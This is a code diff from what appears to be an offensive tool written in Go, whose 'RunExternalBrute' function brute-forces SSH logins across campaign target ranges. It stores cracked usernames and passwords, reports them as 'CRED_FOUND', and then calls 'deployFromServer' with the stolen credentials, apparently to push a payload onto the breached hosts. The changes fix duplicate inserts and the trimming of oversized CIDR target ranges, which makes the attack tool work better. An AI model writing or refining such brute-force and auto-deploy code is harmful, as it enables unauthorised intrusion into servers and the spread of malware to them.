@@ -148,7 +148,8 @@ func (e *Engine) RunExternalBrute(campID, config string) {
 
 					e.db.Exec(`
 						INSERT INTO credentials (username, password, target, port, service, valid)
-						VALUES ($1, $2, $3, $4, 'ssh', true)`,
+						VALUES ($1, $2, $3, $4, 'ssh', true)
+						ON CONFLICT DO NOTHING`,
 						j.username, j.password, j.target, j.port)
 
 					taskOutput := fmt.Sprintf("CRED_FOUND:%s:%s:%s:%d\nExternal brute — cracked via server-side SSH", j.username, j.password, j.target, j.port)
@@ -159,8 +160,6 @@ func (e *Engine) RunExternalBrute(campID, config string) {
 					if terr != nil {
 						log.Printf("[-] Campaign %s: failed to insert task: %v", campID[:8], terr)
 					}
-
-					e.db.Exec(`UPDATE campaigns SET completed_tasks = completed_tasks + 1, updated_at = NOW() WHERE id = $1`, campID)
 
 					go e.deployFromServer(campID, j.username, j.password, j.target, j.port)
 				}
@@ -350,6 +349,8 @@ func expandTarget(target string) []string {
 	if bits-ones > 10 {
 		log.Printf("[!] Brute: CIDR %s too large (max /22), trimming", target)
 		ones = bits - 10
+		ipnet.Mask = net.CIDRMask(ones, bits)
+		ipnet.IP = ip.Mask(ipnet.Mask)
 	}
 
 	var ips []string
